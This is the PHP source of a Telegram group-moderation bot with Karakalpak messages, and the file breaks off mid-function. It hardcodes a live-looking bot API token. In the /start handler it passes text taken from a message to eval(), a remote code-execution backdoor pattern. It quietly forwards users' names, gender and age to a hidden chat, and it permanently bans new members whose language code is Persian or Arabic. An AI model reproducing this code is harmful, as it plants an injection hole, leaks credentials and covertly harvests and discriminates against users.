<?php
error_reporting(0);
ob_start();
define('API_KEY', '1068970788:AAEHgHlD5XAsOcHcXHWbmJvDnar5YMzhGYs');
$admin = "956751252";
$kanali = "@Yebayt18 ";
$secret = "-1001177523776";

   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
} 

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$edname = $editm ->from->first_name;
$message = $update->message;
$mesid = $message->message_id;
$mid = $message->message_id;
$chat_id = $message->chat->id;
$cid = $message->chat->id;
$mtext = $message->text;
$capt = $message->caption;
$fromid=$update->message->from->id;
$forward = $update->message->forward_from;
$editm = $update->edited_message;
$fadmin = $message->from->id;
$cty = $message->chat->type;
$step=file_get_contents("data/$fadmin/name.txt");
//bu yerni o'zgartirishingiz mumkin.

$update = json_decode(file_get_contents('php://input'));
$data = $update->callback_query->data;
$cid2 = $update->callback_query->message->chat->id; 
$cqid = $update->callback_query->id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$botim="Qarawil24_bot";
$soat = date('H:i', strtotime('5 hour'));
$sana = date('d.m.Y', strtotime('5 hour'));
$sana2 = date('z',strtotime('5 hour'));
$gmt = date('O',strtotime('5 hour'));
$oynomi = date('F',strtotime('5 hour'));
$buoy = date('t',strtotime('5 hour'));
$message = $update->message;
$description = $message->chat->description;
$rasm = $message->chat->photo;
$mid = $message->message_id;
$chat_id = $message->chat->id;
$text1 = $message->text;
$gif = $message->animation;
$doc = $message->document;
$title = $message->chat->title;
$description = $message->chat->description;
$fadmin = $message->from->id;
$from_id=$update->message->from->id;
$lang = $message->from->language_code;
$from = $message->from;
$id = $message->reply_to_message->from->id;
$message_id = $message->reply_to_message->message_id;
$from_user_first_name = $message->reply_to_message->from->first_name;
$ismcha = $message->from->first_name;
$familiyacha = $message->from->last_name;
$login00 = $message->from->username;
$message_id = $message->reply_to_message->message_id;
$gif = $message->animation;
$photo = $message->photo;
$sticker = $message->sticker;
$video = $message->video;
$music = $message->audio;
$document = $message->document;
$forward = $message->forward;
$voice = $message->voice;
$from_user_first_name = $message->reply_to_message->from->first_name;
$name = $message->from->first_name;
$ufname = $update->message->from->first_name;
$uname = $update->message->from->last_name;
$user_id = $update->message->from->id;


//Panel methodi
$gif = $message->animation;
$photo = $message->photo;
$sticker = $message->sticker;
$video = $message->video;
$music = $message->audio;
$document = $message->document;
$forward = $message->forward;
$voice = $message->voice;
$doc = $message->document;
$rasm = $message->photo;
$animation = $message->animation;
$music = $update->message->audio;
$contact = $message->contact;
 $location = $message->location;
$video_note = $message->video_note;

//info methodi
$namegroup = $update->message->chat->title;
$tc = $update->message->chat->type;
$gpname = $update->callback_query->message->chat->title;
$tedadmsg = $update->message->message_id;

//Yangi odam id si
$new_chat_members = $message->new_chat_member->id;
$lan = $message->new_chat_member->language_code;
$ism = $message->new_chat_member->first_name;
$username = $message->from->username;
$first_name = $message->from->first_name;
$is_bot = $message->new_chat_member->is_bot;
$step = file_get_contents("stat/$chat_id.step");
$guruhlar = file_get_contents("stat/group.list");
$userlar = file_get_contents("stat/user.list");
$show=file_get_contents("lang/$fromid/lang.txt");
mkdir("warn");
mkdir("stat");
mkdir("sozlama");
mkdir("lang");
mkdir("text");

$update = json_decode(file_get_contents('php://input'));
$ufname = $efede['message']['from']['first_name'];
$uname = $efede['message']['from']['last_name'];

$channel = $update->channel_post;
$channel_text = $channel->text;
$channel_mid = $channel->message_id;
$channel_id = $channel->chat->id;
$channel_user = $channel->chat->username;
$chanel_doc = $channel->document;
$chanel_video = $channel->video;
$channel_audio = $channel->audio;
$channel_audioTitle = $channel_audio->title;
$message_ch = $update->channel_post;
$message_ch_photo = $message_ch->photo;
$channel_id = $channel->chat->id;
$channel_poto = $channel->photo;

$replytx = $message->reply_to_message->text;
$url = $message->entities[0]->type;
$user =  $message->entities[1]->type;
$msgs = json_decode(file_get_contents('msgs.json'),true);
$type = $message->chat->type;
$text = $message->text;
if($type=="supergroup" or $type=="group"){
    $ex = $msgs[$text];
$ex = explode("|",$ex);
    $txt = $ex[rand(0,count($ex)-1)];
bot("sendmessage",[
	'chat_id'=>$message->chat->id,
	'text'=>"$txt",
	'reply_to_message_id'=>$mid
	]);
}


$filee = "coin/$cid.step";
$folder = "coin"; 
$folder2 = "azo"; 

if($replytx){
    if($type=="supergroup"  or $type=="group"){
   	$replytx = $message->reply_to_message->text;
   	      	if(strpos($msgs[$replytx],"$text") !==false){
   	}else{
		$msgs[$replytx] ="$text|$msgs[$replytx]";
		file_put_contents('msgs.json', json_encode($msgs));
	}
	
}
}
if($text=="/del_doc"){
unlink("msgs.json");
bot("sendmessage",[
'reply_to_message_id'=>$mid,
"chat_id"=>$cid,
"text"=>"Тазаланды♻️"
]);
}

if($text=="/doc"){
bot("senddocument",[
"chat_id"=>$message->chat->id,
'reply_to_message_id'=>$mid,
"document"=>new CURLFile("msgs.json")
]);
}

$us = bot('getChatMembersCount',[
'chat_id'=>$cid
]);
$count = $us->result;

// KANALDAN FORWARD
$chpost = $update->channel_post;
$chuser = $chpost->chat->username;
$chpmesid = $chpost->message_id;
$chcaption = $chpost->caption;

if(isset($chpmesid) and (strtolower($chuser) == strtolower(str_replace("@","",$kanali)))){
unlink("news.dat");
file_put_contents("news.txt",$chpmesid);
$chm = file_get_contents("news.txt");
bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$kanali,
'message_id'=>$chm,
]);
}
// KANALDAN FORWARD


// SOZLAMA 
$text = $message->text;
if(isset($text)){
$get = file_get_contents("sozlama/$chat_id");
if($get){}else{
$baza = [
"stiker"=>"true",
"link"=>"true",
"audio"=>"true",
"video"=>"true",
"fayl"=>"true",
"rasm"=>"true",
"forward"=>"true",
"gif"=>"true",
"golos"=>"true",
"contact"=>" true",
"user"=>" true",
"hashtag"=>" true",
 "location"=>"true",
  "video_note"=>"true",
  
];
file_put_contents("sozlama/$chat_id",json_encode($baza));
}
}

$baza = json_decode(file_get_contents("sozlama/$chat_id"),true);
$Sstiker = $baza["stiker"];
$Slink = $baza["link"];
$Saudio = $baza["audio"];
$Svideo = $baza["video"];
$Sfayl = $baza["fayl"];
$Sforward = $baza["forward"];
$Sgif = $baza["gif"];
$Srasm = $baza["rasm"];
$Sgolos = $baza["golos"];
$Scontact = $baza["contact"];
$Suser = $baza["user"];
$Shashtag = $baza["hashtag"];
$Slocation = $baza["location"];
$Svideo_note = $baza["video_note"];


$userID = $update->inline_query->from->id;
$theQuery = $update->inline_query->query;
$cid = $update->inline_query->query;
$description = $update->inline_query->chat->description;
$first_name = $update->inline_query->first_name;
if(mb_stripos($cid,"@")!==false){
$user = bot("getchat",[
	'chat_id'=>$cid,
	]);
$type = $user->result->type;
$id = $user->result->id;
$us = bot('getChatMembersCount',[
	'chat_id'=>$cid
	]);
	$count = $us->result;
if($type=="channel"){
bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'cache_time'=>1,
'results'=>json_encode([[
'type'=>'article',
'id'=>base64_encode(1),
'title'=>"$cid\nгруппасы хаққында мағлыұмат",
'input_message_content'=>[
'disable_web_page_preview'=>true,
'parse_mode' => 'markdown',
'message_text'=>"*📡Канал үсері:*  [$cid]\n*👥Ағзалар*: `$count`\n*🆔Канал id:* `$id`
$description
$first_name",
],
'reply_markup' =>
[ 'inline_keyboard'=>[
                   [["switch_inline_query"=>"", 'text' => "🆔Анықлау"],],
                [['text'=>'✅Ботқа кіріу','url'=>'https://telegram.me/@Qarawil24_bot'],], 
               ] ],
                
]
])
]);
}
//end
if($type=="supergroup"){
bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'cache_time'=>1,
'results'=>json_encode([[
'type'=>'article',
'id'=>base64_encode(1),
'title'=>"$cid\nгруппасы хаққында мағлыумат",
'input_message_content'=>[
'disable_web_page_preview'=>true,
'parse_mode' => 'markdown',
'message_text'=>"*📡Группа усері:*  [$cid]\n*👥 Ағзалар*: `$count`\n*🆔Группа id:* `$id`",
],
'reply_markup' =>
[ 'inline_keyboard'=>[
                   [["switch_inline_query"=>"", 'text' => "🆔Анықлау"],],
               [['text'=>'✅Ботқа кіріу','url'=>'https://telegram.me/@Qarawil24_bot'],], 
                 ] ],

]
])
]);
}
}

if(mb_stripos($mtext,"/url") !== false){ 
bot('SendMessage',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$mid,
'parse_mode'=>"markdown",
'text'=>"*👇🏻Мәрхәмат Сіз Ұщын Щаре Ссылка Таяр!*

➡️`http://telegram.me/share/url?$mtext`

*💎Жаратыущы:* [Qarawil24_bot](https://t.me/Qarawil24_bot)",
   ]);
 }


if($chanel_video or $channel_audio or $channel_poto or $chanel_doc or $channel_text){
    
    $export = bot('exportChatInviteLink',[
    'chat_id'=>$channel_id,
    ]);
    $a = $export->result;
    bot('editMessageCaption',[
        'chat_id'=>$channel_id,
        'caption'=>"👇👉Бізге қосылың👈👇\n [🌐 @$channel_user] ✅ \n 🆔 : [$channel_mid] \n 🆔 : [$channel_id]",
        'message_id'=>$channel_mid,
        'parse_mode'=> 'Markdown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"↪Тарқатыу", "url"=>"https://t.me/share/url?url=https://t.me/$channel_user/$channel_mid"]],
[['text'=>"🎁Досларға жіберіу🎁", "url"=>"https://t.me/share/url?url=https://t.me/$channel_user"]],
            ]
        ])
        ]);
}

if(mb_stripos($text,"Sex")!==false){ 
bot('deleteMessage',[ 
'chat_id'=>$chat_id, 
'message_id'=>$mid,
 'text'=>"Хабарыңыз өщірілді😂👍",
]);
}

    if (($new_chat_members != NUll)&&($is_bot!=true)) {
  if((stripos($lan,"fa")!== false) or (stripos($lan,"ar")!==false)){
      $vaqti = strtotime("+999999999999 minutes");
  bot('kickChatMember', [
      'chat_id' => $chat_id,
      'user_id' => $new_chat_members,
      'until_date'=> $vaqti,
    ]);
    }else{
      $test = "";
       bot('sendmessage',[
       'chat_id'=>$chat_id,
       'text'=>$test,
       'parse_mode'=>'html'
     ]);
   }
    }

if(isset($text)){
  if($cty == "group" or $cty == "supergroup"){
    if(stripos($guruhlar,"$chat_id")!==false){
    }else{
    file_put_contents("stat/group.list","$guruhlar\n$chat_id");
    }
  }else{
   $userlar = file_get_contents("stat/user.list");
   if(stripos($userlar,"$chat_id")!==false){
    }else{
    file_put_contents("stat/user.list","$userlar\n$chat_id");
   }
  }
 }
  
    if (($new_chat_members != NUll)&&($is_bot!=false)) {
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="member"){
   $vaqti = strtotime("+999999999999 minutes");
  bot('kickChatMember', [
      'chat_id' => $chat_id,
      'user_id' => $new_chat_members,
      'until_date'=> $vaqti,
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "❗<b>Группаға тек админлер бот қоса алады!</b>",
      'parse_mode' => 'html'
  ]);
}
}

$admin = "956751252";
$text = $update->message->text;
$chat_id = $update->message->chat->id;
if($text == '/code' and $chat_id == $admin){
bot('sendDocument',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$mid,
'document'=>new CURLFile(__FILE__),
'caption'=>"@Qarawil24_bot Kodi!", 
]);
} 

if($text == "/start" or $text == "/start@Qarawil24_bot:"){
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $chat_id) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanali,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$chat_id") !== false ){
      bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>"Гирром килиш яхши эмас",
      ]);
    } else {

      $id = "$chat_id \n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("coin/$refid.dat");
$usr = $usr + 100; 
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
'text'=>"Достыңызды Щақырып Дұрыс Қылдыңыз😁",
      ]);
    }
  }

  file_put_contents("coin/$cid.dat");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$chat_id,
  'message_id'=>$mesid,
  'parse_mode'=>'markdown',
  'text'=>$start1,
  'reply_to_message_id' => $mesid,
]); 
bot('sendPhoto',[  
'chat_id'=>$chat_id,  
'photo'=>new CURLFile("uzx.jpg"),  
'caption'=>"🤘🏻Біз бенен бірінщі бол @Yebayt18", 
]);  
$chm = file_get_contents("news.txt");
bot('forwardMessage', [
'chat_id'=>$chat_id,
'from_chat_id'=>$kanali,
'message_id'=>$chm,
]);
if($cty == "supergroup" or $cty == "group"){
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
$st = bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"<b>Бот личкасына жазың!</b>",
'parse_mode' => 'html'
]);
  bot('deleteMessage', [
  'chat_id' => $chat_id,
  'message_id' => $mesid,
  ]);
    $stt = $st->result->message_id;
  bot('deleteMessage',[
 'chat_id'=> $chat_id,
 'message_id'=>$stt,
]);
}else{
$first_name = $update->message->from->first_name;
$baza=file_get_contents("stat/user.list");
if(mb_stripos($baza,$chat_id)!==false){
bot('sendmessage',[
'chat_id'=>$chat_id,
'parse_mode'=>"markdown",
'text'=>"👋🏻*Сәлем* $first_name *бөтәм қалейсан меннен пайдаланыу ұщын дізімнен өтіуің керек\n\n🤙🏻Жынсыңды белгіле!*",
'reply_markup'=>json_encode([   
   'inline_keyboard'=>[   
       [['text'=>'👨🏻‍✈️Еркек', 'callback_data' => "Жынсы: 👨🏻‍✈️Еркек"],['text'=>'👩🏻‍✈️Хаял', 'callback_data' => "Жынсы: 👩🏻‍✈️Хаял"]],
]   
])
]);
}else{
$name = $update->message->from->first_name;
$sta = bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=> "😉Сәлем, $first_name2!\n😁Мені таныған болсаңыз керек менің атым *Охран* досларым еркелеп *Охранчик* деп щақырады мені бұндай щақырыұлары маған жудә жағады!\n\n😅Құлласы мен *группаларда ислеймен* мені группаңызға админ қылың мен группаны қарауыллауды баплайман!\n\nМені группаларға қосың😚",
'parse_mode' => 'markdown',
'disable_web_page_preview'=>true,
  'reply_markup'=>json_encode([   
   'inline_keyboard'=>[   
       [['text'=>'ℹБуйрықларым', 'callback_data' => "stat"],['text'=>'📊Статистикам', 'callback_data' => "stat1"]],
       [['text'=>'👷Каналымыз','url'=>'https://t.me/Yebayt18'],['text'=>'💎Қызықлы','callback_data'=>"uzim"]],
            [['text'=>"🆔️Анықлау",'switch_inline_query'=>""]],
            [['text'=>'➡️Группаға қосыу','url'=>'telegram.me/Qarawil24_bot?startgroup=new']]
]   
]),
]);
}
}
}

$callfname = $update->callback_query->from->first_name;
$calluname = $update->callback_query->from->last_name;

if(mb_stripos($data,"Жынсы:")!==false){
   bot('editMessageText',[
   'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
        'text'=> "*👤Жасыңызды Кіргізің:*",
'parse_mode' => 'markdown',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard' =>[
[['text'=>'10-15','callback_data'=>"👤Жасы: 10-15"],['text'=>'16-20','callback_data'=>"👤Жасы: 16-20"]],
[['text'=>'21-22','callback_data'=>"👤Жасы: 21-22"],['text'=>'23+','callback_data'=>"👤Жасы: 23+"]],
]
]),
]);
  bot('sendmessage',[
    'chat_id'=>$secret,
'parse_mode'=>"markdown",
    'text'=>"🆕️*Таза ағза: $callfname $calluname 
$data 
$data*",
    ]);

}

if(mb_stripos($data,"👤Жасы:")!==false){
   bot('editMessageText',[
   'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
'text'=> "😉Сәлем, $first_name2!\n😁Мені таныған болсаңыз керек менің атым *Охран* досларым еркелеп *Охранчик* деп щақырады мені бұндай щақырыұлары маған жудә жағады!\n\n😅Құлласы мен *группаларда ислеймен* мені группаңызға админ қылың мен группаны қарауыллауды баплайман!\n\nМені группаларға қосың😚",
'parse_mode' => 'markdown',
'disable_web_page_preview'=>true,
  'reply_markup'=>json_encode([   
   'inline_keyboard'=>[   
       [['text'=>'ℹБуйрықларым', 'callback_data' => "stat"],['text'=>'📊Статистикам', 'callback_data' => "stat1"]],
       [['text'=>'👷Каналымыз','url'=>'https://t.me/Yebayt18'],['text'=>'💎Қызықлы','callback_data'=>"uzim"]],
            [['text'=>"🆔️Анықлау",'switch_inline_query'=>""]],
            [['text'=>'➡️Группаға қосыу','url'=>'telegram.me/Qarawil24_bot?startgroup=new']]
]   
]),
]);
  bot('sendmessage',[
    'chat_id'=>$secret,
'parse_mode'=>"markdown",
    'text'=>"🆕️*Таза ағза: $callfname $calluname 
$data $data*",
    ]);
}

if($text == "Lg"&&$fadmin==$admin){
  bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>$guruhlar,
    ]);
}

if($text == "Lu"&&$fadmin==$admin){
  bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>$userlar,
    ]);
}

if($data=="stat1"){
$gr = substr_count($guruhlar,"\n"); 
$us = substr_count($userlar,"\n"); 
$obsh = $gr + $us;
 $saat = date('H:i:s', strtotime('5 hour'));
$bugin = date ('d.m.Y', strtotime('5 hour'));
   bot('editMessageText',[
   'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
    'text'=> "📊<b>Бот статистикасы:</b>\n\n👤Ағзалар: <b>$us</b>\n👥Группалар: <b>$gr</b>\n📣Хәммесі: <b>$obsh</b>\n👮 @KaRaKaLPaKxD\n\n$bugin $saat",
'parse_mode' => 'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(
['inline_keyboard' => [
  [['text'=>'♻Жаңалау', 'callback_data' => "stat1"]],
  [['text'=>'🔙Артқа', 'callback_data' => "back"]]
]
]),
]);
}

if($data=="back"){
   bot('editMessageText',[                                                       
   'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
'text'=> "😉Сәлем, $first_name2!\n😁Мені таныған болсаңыз керек менің атым *Охран* досларым еркелеп *Охранчик* деп щақырады мені бұндай щақырыұлары маған жудә жағады!\n\n😅Құлласы мен *группаларда ислеймен* мені группаңызға админ қылың мен группаны қарауыллауды баплайман!\n\nМені группаларға қосың😚",
'parse_mode' => 'markdown',
'disable_web_page_preview'=>true,
  'reply_markup'=>json_encode([   
   'inline_keyboard'=>[   
       [['text'=>'ℹБуйрықларым', 'callback_data' => "stat"],['text'=>'📊Статистикам', 'callback_data' => "stat1"]],
       [['text'=>'👷Каналымыз','url'=>'https://t.me/Yebayt18'],['text'=>'💎Қызықлы','callback_data'=>"uzim"]],
            [['text'=>"🆔️Анықлау",'switch_inline_query'=>""]],
            [['text'=>'➡️Группаға қосыу','url'=>'telegram.me/Qarawil24_bot?startgroup=new']]
]   
]),
]);
}


if((stripos($mtext,"1001")!==false) and $fadmin==$admin){
      $lx=explode("\n",$mtext);
      $idsi = $lx[0];
  $lin  = bot('exportchatinvitelink',[
       'chat_id'=>"-$idsi",
       ]);
  $link = $lin->result;
   bot('sendMessage',[
       'chat_id'=>$admin,
       'text'=>"$link",
     ]);
}
     
 if($data=="stat"){
   bot('editMessageText',[
   'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
    'text'=> "👷🏻‍♂<b>Бот Телеграм Тармағындағы Хәмме Супер Группаларда Өз Жумысын Алып Бара Алады Хәм Группа Жаратыущысы Хәм Админлер Ұщын Қолайлы Буйрықлар Менен Іслемекте. Хәзірде Бұл Бот Телеграм Тармағында Жудә Тез Пәт Пенен Рауажланбақта Хәм Боттан Пайдаланыущыларыда Тез Пәт Пенен Өсіп Бармақта.\n\nБоттағы Бәрще Буйрықлар:</b>

1) <code>/mute</code> - <b>Группа Ағзасының Жазыуын Щеклеп Қойыу</b>

2) <code>/unmute</code> - <b>Группа Ағзасын Жазыуына Рухсат Беріу</b>

3) <code>/kick</code> - <b>Группа Ағзасын Группадан Щығарып Жіберіу</b>

4) <code>/ban</code> - <b>Пайдаланыущыны Группадан Бір Өмірге Щығарып Жіберіу</b>

5) <code>/unban</code> - <b>Группа Ағзасын Баннан Алыү</b>

6) <code>/warn</code> - <b>Пайдаланыұщыға Жаза Беріу</b>

7) <code>/nowarn</code> - <b>Бәрще Ескертіулерді Алып Таслау</b>

8) <code>/leave</code> - <b>Бот группадан шығып кетеди</b>

9) <code>/admins</code> - <b>Пайдаланыущыны Группа Админі Қыламан</b>

10) <code>/panel</code> - <b>Ботты Группаға Сазлау</b>

<b>Бот Админі:</b> @KaRaKaLPaKxD",
'parse_mode' => 'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(
['inline_keyboard' => [
[['text'=>'🔙Артқа', 'callback_data' => "back"]],
]
]),
]);
}

if($data=="uzim"){
   bot('editMessageText',[
   'chat_id'=>$chat_id2,
    'message_id'=>$message_id2,
    'text'=> "💎<b>Қызықлы буйрықлар:</b>

<b>/ism хәм сөз</b> - Атыңыз Мәнісін Айтады

<b>/logo хәм сөз</b> - Әжайып Ұсылда Турлі Лого Іслеймен

<b>/keep хәм сөз</b> - Әжайып Ұсылда Лого Ислеймен

<b>/love хәм сөз</b> - I Love ге жазыу

<b>/url хәм сөз</b> -  Шаре ссилка таярлаұ

<b>/screen хәм сайт</b> - Сайтты скрееншот қылыу

<b>/saat</b> -  Анық саатты айтады

<b>/bugin</b> - Кун, Ай хам жылды көрсетеди

<b>Бот математик әмеллердіде ислей алады мысалы:</b> <code>2+2</code>

<b>Бот Админі:</b> @KaRaKaLPaKxD",
'parse_mode' => 'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(
['inline_keyboard' => [
[['text'=>'🔙Артқа', 'callback_data' => "back"]],
]
]),
]);
}
// Qo'shimcha funksiyalar

if(mb_stripos($mtext,"/keep") !== false){ 
$soz = explode(" ",$text);
bot('SendPhoto',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$mid,
'photo'=>"http://www.keepcalmstudio.com/-/p.php?t=%EE%BB%AA%0D%0AKEEP%0D%0ACALM%0D%0A$soz[1]%0D%0A$soz[2]%0D%0A$soz[3]&bc=000000&tc=FFFFFF&cc=FFFFFF&uc=true&ts=true&ff=PNG&w=500&ps=sq",
'caption'=>"By @Qarawil24_bot 💎",
]);
}

if(mb_stripos($mtext,"/love") !== false){ 
$ex = explode(" ",$text);
bot('SendPhoto',[
'chat_id'=>$chat_id, 'reply_to_message_id'=>$mid,
'photo'=>"http://www.iloveheartstudio.com/-/p.php?t=$ex[1]%EE%BB%AE$ex[2]%20$ex[3]%0A$ex[4]%0D%0ABy%20%20@KaRaKaLPaKxD&bc=000000&tc=ffffff&hc=FF0000&f=n&uc=true&ts=true&ff=PNG&w=500&ps=sq",
'caption'=>"By @Qarawil24_bot 💎",
]);
}

if($text == "/title"){
bot('setChatTitle',[
'chat_id'=>$chat_id,
'reply_to_message_id'=>$mid,
'title'=>"$title",
]);
}

if(mb_stripos($mtext,"/screen") !== false){ 
$ex = explode(" ",$text);
bot('SendPhoto',[
'chat_id'=>$chat_id, 'reply_to_message_id'=>$mid,
'photo'=>"https://api.site-shot.com/?url=$ex[1]",
'caption'=>"By @Qarawil24_bot 💎",
]);
}
/// YANGI KOD
if($text == "/panel" or $text == "/panel@Qarawil24_bot"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
$baza = json_decode(file_get_contents("sozlama/$chat_id"),true);
$stiker = $baza["stiker"];
if($stiker == "false"){
$stiker = "☑Рухсат етілмеген";
}else{
$stiker = "✅Рухсат етілген";
}
$link = $baza["link"];
if($link == "false"){
$link = "☑Рухсат етілмеген";
}else{
$link = "✅Рухсат етілген";
}
$audio = $baza["audio"];
if($audio == "false"){
$audio = "☑Рухсат етілмеген";
}else{
$audio = "✅Рухсат етілген";
}
$video = $baza["video"];
if($video == "false"){
$video  = "☑Рухсат етілмеген";
}else{
$video = "✅Рухсат етілген";
}
$fayl = $baza["fayl"];
if($fayl == "false"){
$fayl  = "☑Рухсат етілмеген";
}else{
$fayl = "✅Рухсат етілген";
}
$forward1 = $baza["forward"];
if($forward1 == "false"){
$forward1  = "☑Рухсат етілмеген";
}else{
$forward1 = "✅Рухсат етілген";
}
$gif = $baza["gif"];
if($gif == "false"){
$gif  = "☑Рухсат етілмеген";
}else{
$gif = "✅Рухсат етілген";
}
$rasm = $baza["rasm"];
if($rasm == "false"){
$rasm  = "☑Рухсат етілмеген";
}else{
$rasm = "✅Рухсат етілген";
}
$golos = $baza["golos"];
if($golos == "false"){
$golos  = "☑Рухсат етілмеген";
}else{
$golos = "✅Рухсат етілген";
}
$contact = $baza["contact"];
if($contact == "false"){
$contact = "☑Рухсат етілмеген";
}else{
$contact = "✅Рухсат етілген";
}
$user = $baza["user"];
if($user == "false"){
$user = "☑Рухсат етілмеген";
}else{
$user = "✅Рухсат етілген";
}
$hashtag = $baza["hashtag"];
if($hashtag == "false"){
$hashtag = "☑Рухсат етілмеген";
}else{
$hashtag = "✅Рухсат етілген";
}
 $location = $baza["location"];
if($location == "false"){
$location = "☑Рухсат етілмеген";
}else{
$location = "✅Рухсат етілген";
}
$video_note = $baza["video_note"];
if($video_note == "false"){
$video_note  = "☑Рухсат етілмеген";
}else{
$video_note = "✅Рухсат етілген";
}

file_put_contents("sozlama/$fadmin.lch","$chat_id");
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"<b>Личкаңызға Жібердім!</b>",
'parse_mode'=>'html',
]);
bot('sendMessage', [
'chat_id'=>$fadmin,
'text'=>"<a href='tg://user?id=$chat_id'>$title</a> <b>группасын сазлау ұщын төмендегі туймелерден пайдаланың:👇</b>\n<b>✅Рухсат етілгенРухсат етілген</b>\n<b>☑Рухсат етілмеген</b>",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[["callback_data"=>"rasm","text"=>"📷Фото"],["callback_data"=>"M()rasm","text"=>"$rasm"],],
[["callback_data"=>"link","text"=>"📡Линк"],["callback_data"=>"M()link","text"=>"$link"],],
[["callback_data"=>"stiker","text"=>"🎭Стикер"],["callback_data"=>"M()stiker","text"=>"$stiker"],],
[["callback_data"=>"fayl","text"=>"📁Файл"],["callback_data"=>"M()fayl","text"=>"$fayl"],],
[["callback_data"=>"video","text"=>"🎬Видео"],["callback_data"=>"M()video","text"=>"$video"],],
[["callback_data"=>"audio","text"=>"🎶 Музыка"],["callback_data"=>"M()audio","text"=>"$audio"],],
[["callback_data"=>"forward","text"=>"➡ Форуард"],["callback_data"=>"M()forward","text"=>"$forward1"],],
[["callback_data"=>"gif","text"=>"💾Гиф"],["callback_data"=>"M()gif","text"=>"$gif"],],
[["callback_data"=>"golos","text"=>"🎤Голось"],["callback_data"=>"M()golos","text"=>"$golos"],],
[["callback_data"=>"contact","text"=>"👤Контакт"],["callback_data"=>"M()contact","text"=>"$contact"],],
[["callback_data"=>"user","text"=>"📧Юзерлер"],["callback_data"=>"M()user","text"=>"$user"],],
[["callback_data"=>"hashtag","text"=>"#⃣ХещТег"],["callback_data"=>"M()hashtag","text"=>"$hashtag"],],
[["callback_data"=>"location","text"=>"🏠Мәнзіл"],["callback_data"=>"M()location","text"=>"$location"],],
[["callback_data"=>"video_note","text"=>"📹Домалақ Видео"],["callback_data"=>"M()video_note","text"=>"$video_note"],],
]
]),
]);
}
}

$callback = $update->callback_query;
$dataa = $callback->data;
$dataa = explode("()",$dataa);
if($dataa[0] == "M"){
$cid = $callback->from->id;
$mid = $callback->message->message_id;
$imid = $callback->inline_message_id;
$idd = file_get_contents("sozlama/$cid.lch");
$gets = bot("getChat",[
"chat_id"=>"$idd",
]);
$title = $gets->result->title;
$baza = json_decode(file_get_contents("sozlama/$idd"),true);
if($baza["$dataa[1]"] == "true"){
$input = "false";
}else{
$input = "true";
}
$baza["$dataa[1]"] = $input;
file_put_contents("sozlama/$idd",json_encode($baza));
$baza = json_decode(file_get_contents("sozlama/$idd"),true);
$stiker = $baza["stiker"];
if($stiker == "false"){
$stiker = "☑Рухсат етілмеген";
}else{
$stiker = "✅Рухсат етілген";
}
$link = $baza["link"];
if($link == "false"){
$link = "☑Рухсат етілмеген";
}else{
$link = "✅Рухсат етілген";
}
$audio = $baza["audio"];
if($audio == "false"){
$audio = "☑Рухсат етілмеген";
}else{
$audio = "✅Рухсат етілген";
}
$video = $baza["video"];
if($video == "false"){
$video  = "☑Рухсат етілмеген";
}else{
$video = "✅Рухсат етілген";
}
$fayl = $baza["fayl"];
if($fayl == "false"){
$fayl  = "☑Рухсат етілмеген";
}else{
